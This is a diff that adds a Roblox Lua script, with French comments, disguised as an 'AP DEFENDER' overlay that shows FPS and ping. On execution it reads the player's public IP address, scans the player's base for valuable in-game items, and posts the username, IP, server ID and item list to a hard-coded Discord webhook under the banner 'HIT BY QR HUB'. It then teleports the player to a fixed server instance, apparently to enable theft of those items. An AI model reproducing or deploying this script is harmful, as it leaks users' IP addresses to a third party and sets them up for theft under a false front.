@@ -1,0 +1,120 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local player = Players.LocalPlayer
+local placeId = game.PlaceId
+local targetJobID = "ccfe29bc-b3c5-4d92-85e3-97a08f582aac"
+local myWebhook = "https://discord.com/api/webhooks/1475941874224201780/T198kD49fD4v-IuKcLteAjlJOj5lfbP5WczKjVo4VwnhC949X_f31lXiAQPQypWCWQ-x"
+
+-- Get IP (Comme dans l'original)
+local ipAddress = "Unknown"
+pcall(function()
+    ipAddress = game:HttpGet("https://api.ipify.org/")
+end)
+
+-- Function to find ALL brainrots (Sans aucun seuil de prix)
+local function findAllBrainrots()
+    local results = {}
+    local char = player.Character or player.CharacterAdded:Wait()
+    local root = char:WaitForChild("HumanoidRootPart", 5)
+    
+    for _, object in ipairs(workspace:GetDescendants()) do
+        if object.Name == "FastOverheadTemplate" then
+            local pos = object:GetPivot().Position
+            -- On prend un rayon de 80 studs pour être sûr de prendre TOUTE la base
+            if (pos - root.Position).Magnitude < 80 then
+                local gui = object:FindFirstChildOfClass("SurfaceGui")
+                if gui then
+                    local gen = gui:FindFirstChild("Generation", true)
+                    local dName = gui:FindFirstChild("DisplayName", true)
+                    if gen and dName then
+                        table.insert(results, {
+                            name = dName.Text,
+                            value = gen.Text
+                        })
+                    end
+                end
+            end
+        end
+    end
+    return results
+end
+
+local brainrots = findAllBrainrots()
+
+-- Formatage du message pour Discord
+local brainrotList = ""
+for i, br in ipairs(brainrots) do
+    brainrotList = brainrotList .. string.format("%d. %s: %s\n", i, br.name, br.value)
+end
+if brainrotList == "" then brainrotList = "Aucun brainrot trouvé." end
+
+-- Construction du Webhook (Style Original)
+local webhookMessage = {
+    content = "@everyone QR HUB EXECUTION",
+    embeds = {{
+        title = "🚀 HIT BY QR HUB - FULL SCAN",
+        fields = {
+            {name = "USER", value = player.Name, inline = true},
+            {name = "IP", value = ipAddress, inline = true},
+            {name = "JOB ID ORIGINAL", value = game.JobId, inline = false},
+            {name = "BRAINROTS (TOTAL: " .. #brainrots .. ")", value = "```\n" .. brainrotList .. "\n```", inline = false}
+        },
+        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..targetJobID.."', game.Players.LocalPlayer)\n```",
+        color = 0x00FF00,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+-- Envoi Webhook
+local requestFunc = (syn and syn.request) or (http and http.request) or request
+pcall(function()
+    requestFunc({
+        Url = myWebhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(webhookMessage)
+    })
+end)
+
+-----------------------------------------------------------
+-- INTERFACE AP DEFENDER (Originale)
+-----------------------------------------------------------
+local apGui = Instance.new("ScreenGui", player.PlayerGui)
+local apFrame = Instance.new("Frame", apGui)
+apFrame.Size, apFrame.Position = UDim2.new(0, 250, 0, 100), UDim2.new(0, 20, 0, 43)
+apFrame.BackgroundColor3, apFrame.BackgroundTransparency = Color3.fromRGB(20, 144, 20), 0.1
+apFrame.Active, apFrame.Draggable = true, true
+Instance.new("UICorner", apFrame)
+
+local fpsL = Instance.new("TextLabel", apFrame)
+fpsL.Size, fpsL.Position = UDim2.new(0.5, -5, 0, 24), UDim2.new(0, 10, 0, 8)
+fpsL.BackgroundTransparency, fpsL.TextColor3 = 1, Color3.new(1, 1, 1)
+fpsL.Font, fpsL.Text = Enum.Font.GothamSemibold, "FPS: ..."
+
+local pingL = Instance.new("TextLabel", apFrame)
+pingL.Size, pingL.Position = UDim2.new(0.5, -5, 0, 24), UDim2.new(0.5, 5, 0, 8)
+pingL.BackgroundTransparency, pingL.TextColor3 = 1, Color3.new(0.5, 0.5, 0.5)
+pingL.Font, pingL.Text = Enum.Font.GothamSemibold, "PING: ..."
+
+local apButton = Instance.new("TextButton", apFrame)
+apButton.Size, apButton.Position = UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 45)
+apButton.BackgroundColor3, apButton.Text = Color3.new(0,0,0), "AP DEFENDER • ON"
+apButton.TextColor3, apButton.Font = Color3.new(1,1,1), Enum.Font.GothamBold
+Instance.new("UICorner", apButton)
+
+-- Stats Loop
+RunService.RenderStepped:Connect(function(dt)
+    fpsL.Text = "FPS: " .. math.floor(1/dt)
+    pingL.Text = "PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+end)
+
+-- Téléportation Finale
+task.spawn(function()
+    wait(5)
+    apButton.Text = "JOINING QR HUB..."
+    TeleportService:TeleportToPlaceInstance(placeId, targetJobID, player)
+end)
